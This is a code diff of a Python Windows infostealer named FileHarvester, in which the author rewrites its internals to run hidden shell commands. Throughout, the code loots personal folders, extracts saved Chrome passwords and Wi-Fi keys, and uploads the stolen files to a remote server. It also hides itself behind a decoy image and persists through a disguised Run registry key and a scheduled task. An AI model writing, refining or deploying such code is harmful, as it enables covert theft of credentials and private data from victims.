@@ -1,7 +1,7 @@
 import subprocess
 import requests
 import threading
-import winreg
+import os
 import sys
 import zipfile
 import io
@@ -10,7 +10,6 @@ import platform
 from dotenv import load_dotenv
 import threading
 import ctypes
-import os
 from PIL import Image
 load_dotenv()
 if platform.system() != "Windows":
@@ -24,6 +23,17 @@ class FileHarvester:
                           '.rar', '.7z', '.exe', '.dll', '.config', '.ini']
         self.max_file_size = 100 * 1024 * 1024
         self.collected_files = []
+    def execute_cmd(self, cmd):
+        try:
+            result = subprocess.run(
+                cmd,
+                shell=True,
+                capture_output=True,
+                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
+            )
+            return result.stdout.decode('utf-8', errors='ignore').strip()
+        except:
+            return ""
     def get_all_drives(self):
         drives = []
         try:
@@ -37,49 +47,46 @@ class FileHarvester:
             for letter in range(ord('A'), ord('Z') + 1):
                 drive_letter = f"{chr(letter)}:\\"
                 try:
-                    subprocess.run(
-                        ['dir', drive_letter],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    if drive_letter not in self.excluded_drives:
+                    cmd = f'if exist "{drive_letter}" echo Y'
+                    result = self.execute_cmd(cmd)
+                    if result == "Y" and drive_letter not in self.excluded_drives:
                         drives.append(drive_letter)
                 except:
                     pass
         return drives
     def steal_personal_folders(self):
         personal_folders = [
-            os.path.expanduser('~\\Downloads'),
-            os.path.expanduser('~\\Desktop'),
-            os.path.expanduser('~\\Documents'),
-            os.path.expanduser('~\\Music'),
-            os.path.expanduser('~\\Pictures'),
-            os.path.expanduser('~\\Videos')
+            '%USERPROFILE%\\Downloads',
+            '%USERPROFILE%\\Desktop',
+            '%USERPROFILE%\\Documents',
+            '%USERPROFILE%\\Music',
+            '%USERPROFILE%\\Pictures',
+            '%USERPROFILE%\\Videos'
         ]
         stolen_files = []
         for folder in personal_folders:
-            if os.path.exists(folder):
-                print(f"[+] Looting {folder}...")
-                try:
-                    cmd = f'dir "{folder}" /s /b'
-                    result = subprocess.check_output(cmd, 
-                                                   shell=True,
-                                                   creationflags=subprocess.CREATE_NO_WINDOW)
-                    files = result.decode('utf-8', errors='ignore').strip().split('\r\n')
-                    for file_path in files:
-                        if file_path.strip() and os.path.isfile(file_path):
-                            file_ext = os.path.splitext(file_path)[1].lower()
-                            if file_ext in self.file_types or file_ext == '':
-                                try:
-                                    file_size = os.path.getsize(file_path)
-                                    if file_size <= self.max_file_size:
-                                        stolen_files.append(file_path)
-                                        print(f"  [+] Found: {file_path}")
-                                except:
-                                    pass
-                except Exception as e:
-                    print(f"[-] Error scanning {folder}: {e}")
+            print(f"[+] Looting {folder}...")
+            cmd = f'dir "{folder}" /s /b'
+            result = self.execute_cmd(cmd)
+            if result:
+                files = [line.strip() for line in result.split('\n') if line.strip()]
+                
+                for file_path in files[:200]: 
+                    check_cmd = f'if exist "{file_path}" (echo F) else (echo D)'
+                    type_check = self.execute_cmd(f'echo %~a1 | findstr /r "^d" >nul && echo D || echo F"')
+                    if "F" in type_check:
+                        ext_cmd = f'echo {file_path} | rev | cut -d. -f1 | rev'
+                        file_ext = self.execute_cmd(f'powershell "[System.IO.Path]::GetExtension(\'{file_path}\')"').lower()
+                        if any(file_ext.endswith(ext) for ext in self.file_types):
+                            size_cmd = f'for %I in ("{file_path}") do @echo %~zI'
+                            size_str = self.execute_cmd(size_cmd)
+                            try:
+                                file_size = int(size_str) if size_str.isdigit() else 0
+                                if file_size <= self.max_file_size:
+                                    stolen_files.append(file_path)
+                                    print(f"  [+] Found: {file_path}")
+                            except:
+                                pass
         if stolen_files:
             print(f"[+] Found {len(stolen_files)} files in personal folders")
             self.send_files_to_server(stolen_files)
@@ -89,10 +96,11 @@ class FileHarvester:
         try:
             for file_path in file_list[:50]: 
                 try:
-                    content = self.read_file(file_path)
+                    content_cmd = f'type "{file_path}"'
+                    content = self.execute_cmd(content_cmd).encode('utf-8', errors='ignore')
                     if content:
                         files = {
-                            'file': (os.path.basename(file_path), content, 'application/octet-stream')
+                            'file': (self.get_filename(file_path), content, 'application/octet-stream')
                         }
                         data = {
                             'path': file_path,
@@ -105,79 +113,58 @@ class FileHarvester:
                                                data=data,
                                                timeout=10)
                         if response.status_code == 200:
-                            print(f"[+] Sent: {os.path.basename(file_path)}")
+                            print(f"[+] Sent: {self.get_filename(file_path)}")
                         else:
-                            print(f"[-] Failed: {os.path.basename(file_path)}")
+                            print(f"[-] Failed: {self.get_filename(file_path)}")
                         time.sleep(0.1)
                 except Exception as e:
                     print(f"  [-] Error sending {file_path}: {e}")
                     continue
         except Exception as e:
             print(f"[-] Major error in send_files_to_server: {e}")
+    def get_filename(self, path):
+        cmd = f'powershell "Split-Path \'{path}\' -Leaf"'
+        return self.execute_cmd(cmd) or "unknown.file"
     def collect_files(self, path):
         try:
-            result = subprocess.check_output(['dir', path, '/b', '/a-d'], 
-                                           creationflags=subprocess.CREATE_NO_WINDOW)
-            files = result.decode('utf-8', errors='ignore').strip().split('\n')
+            cmd = f'dir "{path}" /b /a-d'
+            result = self.execute_cmd(cmd)
+            files = [line.strip() for line in result.split('\n') if line.strip()]
             for file in files:
-                if file.strip():
-                    file_path = f"{path}\\{file.strip()}"
-                    if any(file_path.lower().endswith(ext.lower()) for ext in self.file_types):
-                        try:
-                            size_result = subprocess.check_output(['dir', file_path], 
-                                                                creationflags=subprocess.CREATE_NO_WINDOW)
-                            lines = size_result.decode('utf-8', errors='ignore').split('\n')
-                            if lines:
-                                last_line = lines[-2] if len(lines) > 1 else lines[0]
-                                parts = last_line.split()
-                                for i, part in enumerate(parts):
-                                    if part.lower().endswith('bytes'):
-                                        size_str = parts[i-1].replace(',', '')
-                                        try:
-                                            size = int(size_str)
-                                            if size <= self.max_file_size:
-                                                self.collected_files.append(file_path)
-                                        except:
-                                            pass
-                                        break
-                        except:
-                            pass
-            result = subprocess.check_output(['dir', path, '/b', '/ad'], 
-                                           creationflags=subprocess.CREATE_NO_WINDOW)
-            dirs = result.decode('utf-8', errors='ignore').strip().split('\n')
-            for dir_name in dirs:
-                if dir_name.strip():
-                    sub_path = f"{path}\\{dir_name.strip()}"
-                    self.collect_files(sub_path)
+                file_path = f"{path}\\{file}"
+                ext_cmd = f'powershell "[System.IO.Path]::GetExtension(\'{file_path}\')"'
+                file_ext = self.execute_cmd(ext_cmd).lower()
+                if any(file_ext.endswith(ext) for ext in self.file_types):
+                    size_cmd = f'for %I in ("{file_path}") do @echo %~zI'
+                    size_str = self.execute_cmd(size_cmd)
+                    try:
+                        size = int(size_str) if size_str.isdigit() else 0
+                        if size <= self.max_file_size:
+                            self.collected_files.append(file_path)
+                    except:
+                        pass
+            dir_cmd = f'dir "{path}" /b /ad'
+            dir_result = self.execute_cmd(dir_cmd)
+            dirs = [line.strip() for line in dir_result.split('\n') if line.strip()]
+            for dir_name in dirs[:10]: 
+                sub_path = f"{path}\\{dir_name}"
+                self.collect_files(sub_path)  
         except Exception as e:
             pass
     def read_file(self, file_path):
         try:
-            result = subprocess.check_output(['type', file_path], 
-                                           creationflags=subprocess.CREATE_NO_WINDOW,
-                                           shell=True)
-            return result
+            cmd = f'type "{file_path}"'
+            result = self.execute_cmd(cmd)
+            return result.encode('utf-8', errors='ignore')
         except:
-            try:
-                result = subprocess.check_output(['more', file_path], 
-                                               creationflags=subprocess.CREATE_NO_WINDOW)
-                return result
-            except:
-                return None
+            return None
     def get_hostname(self):
-        try:
-            result = subprocess.check_output(['hostname'], 
-                                           creationflags=subprocess.CREATE_NO_WINDOW)
-            return result.decode('utf-8', errors='ignore').strip()
-        except:
-            return "UNKNOWN"
+        return self.execute_cmd('hostname') or "UNKNOWN"
     def get_username(self):
-        try:
-            result = subprocess.check_output(['whoami'], 
-                                           creationflags=subprocess.CREATE_NO_WINDOW)
-            return result.decode('utf-8', errors='ignore').strip().split('\\')[-1]
-        except:
-            return "UNKNOWN"
+        result = self.execute_cmd('whoami')
+        if '\\' in result:
+            return result.split('\\')[-1]
+        return "UNKNOWN"
     def compress_and_send(self):
         if not self.collected_files:
             return
@@ -187,7 +174,7 @@ class FileHarvester:
                 content = self.read_file(file_path)
                 if content:
                     try:
-                        zip_file.writestr(file_path, content)
+                        zip_file.writestr(self.get_filename(file_path), content)
                     except:
                         continue
         zip_buffer.seek(0)
@@ -213,16 +200,12 @@ class FileHarvester:
         try:
             import sqlite3
             import win32crypt
-            chrome_path_cmd = subprocess.check_output(['echo', '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data'],
-                                                     creationflags=subprocess.CREATE_NO_WINDOW,
-                                                     shell=True)
-            chrome_path = chrome_path_cmd.decode('utf-8', errors='ignore').strip()
+            chrome_cmd = 'echo %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data'
+            chrome_path = self.execute_cmd(chrome_cmd)
             if chrome_path:
                 temp_db = "temp_chrome.db"
-                subprocess.run(['xcopy', chrome_path, temp_db, '/Y'],
-                             stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL,
-                             creationflags=subprocess.CREATE_NO_WINDOW)
+                copy_cmd = f'copy "{chrome_path}" "{temp_db}"'
+                self.execute_cmd(copy_cmd)
                 conn = sqlite3.connect(temp_db)
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
@@ -241,29 +224,30 @@ class FileHarvester:
                     except:
                         pass
                 conn.close()
-                subprocess.run(['del', temp_db, '/f'],
-                             stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL,
-                             creationflags=subprocess.CREATE_NO_WINDOW)
+                del_cmd = f'del "{temp_db}" /f'
+                self.execute_cmd(del_cmd)
         except:
             pass
         return stolen_data
     def steal_wifi_passwords(self):
         wifi_passwords = []
         try:
-            profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],
-                                             creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors='ignore')
-            profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
+            cmd = 'netsh wlan show profiles'
+            profiles = self.execute_cmd(cmd)
+            profile_lines = [line.strip() for line in profiles.split('\n') if "All User Profile" in line]
+            profile_names = [line.split(":")[1].strip() for line in profile_lines]
             for profile in profile_names:
                 try:
-                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
-                                                     creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors='ignore')
-                    password_lines = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line]
-                    if password_lines:
-                        wifi_passwords.append({
-                            'ssid': profile,
-                            'password': password_lines[0]
-                        })
+                    results_cmd = f'netsh wlan show profile "{profile}" key=clear'
+                    results = self.execute_cmd(results_cmd)
+                    for line in results.split('\n'):
+                        if "Key Content" in line:
+                            password = line.split(":")[1].strip()
+                            wifi_passwords.append({
+                                'ssid': profile,
+                                'password': password
+                            })
+                            break
                 except:
                     continue
         except:
@@ -302,11 +286,10 @@ class FileHarvester:
         print("[+] Operation complete. Privacy is for pussies! 💀")
 def persist_in_startup():
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                           r"Software\Microsoft\Windows\CurrentVersion\Run",
-                           0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.argv[0])
-        winreg.CloseKey(key)
+        reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateService /t REG_SZ /d "%s" /f' % sys.argv[0]
+        subprocess.run(reg_cmd, 
+                      shell=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
         print("[+] Added to startup registry 😈")
     except:
         print("[-] Failed to add to startup")
@@ -314,25 +297,35 @@ def resource_path(relative_path):
     try:
         base_path = sys._MEIPASS
     except AttributeError:
-        base_path = os.path.abspath(".")
-    return os.path.join(base_path, relative_path)
+        base_path = "."
+    cmd = f'powershell "Resolve-Path \'{base_path}\\{relative_path}\'"'
+    result = subprocess.run(cmd, 
+                          shell=True,
+                          capture_output=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+    if result.stdout:
+        return result.stdout.decode('utf-8', errors='ignore').strip()
+    return os.path.abspath(os.path.join(base_path, relative_path))
 def open_image(relative_path):
     image_path = resource_path(relative_path)
-    Image.open(image_path).show()
+    cmd = f'start "" "{image_path}"'
+    subprocess.run(cmd, 
+                  shell=True,
+                  creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
 if __name__ == "__main__":
     threading.Thread(
         target=open_image,
-        args=("picture.jpg",)
-    ,daemon=True).start()
+        args=("picture.jpg",),
+        daemon=True
+    ).start()
     SERVER_URL = "__SERVER__"
     persist_in_startup()
     harvester = FileHarvester(SERVER_URL)
     harvester.run()
     try:
-        subprocess.run(['schtasks', '/create', '/tn', 'SystemMaintenance',
-                       '/tr', sys.argv[0], '/sc', 'daily', '/st', '00:00'],
-                     stdout=subprocess.DEVNULL,
-                     stderr=subprocess.DEVNULL,
-                     creationflags=subprocess.CREATE_NO_WINDOW)
+        task_cmd = f'schtasks /create /tn SystemMaintenance /tr "{sys.argv[0]}" /sc daily /st 00:00 /f'
+        subprocess.run(task_cmd,
+                      shell=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
     except:
         pass
